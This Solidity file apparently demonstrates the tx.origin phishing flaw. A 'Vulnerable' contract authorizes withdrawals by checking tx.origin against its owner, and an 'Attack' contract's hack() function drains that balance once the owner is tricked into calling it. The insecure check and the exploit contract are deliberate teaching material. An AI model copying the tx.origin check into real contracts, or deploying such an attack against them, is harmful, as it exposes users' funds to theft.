// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract Vulnerable {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function withdraw(address payable _recipient) public {
        require(tx.origin == owner, "You are not the owner");
        _recipient.transfer(address(this).balance);
    }

    receive() external payable {

    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}

contract Attack {
    address payable owner;
    Vulnerable vulnerable;

    constructor(Vulnerable _vulnerable) {
        owner = payable(msg.sender);
        vulnerable = Vulnerable(_vulnerable);
    }

    function hack() public {
        vulnerable.withdraw(payable(address(this)));
    }

     receive() external payable {
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}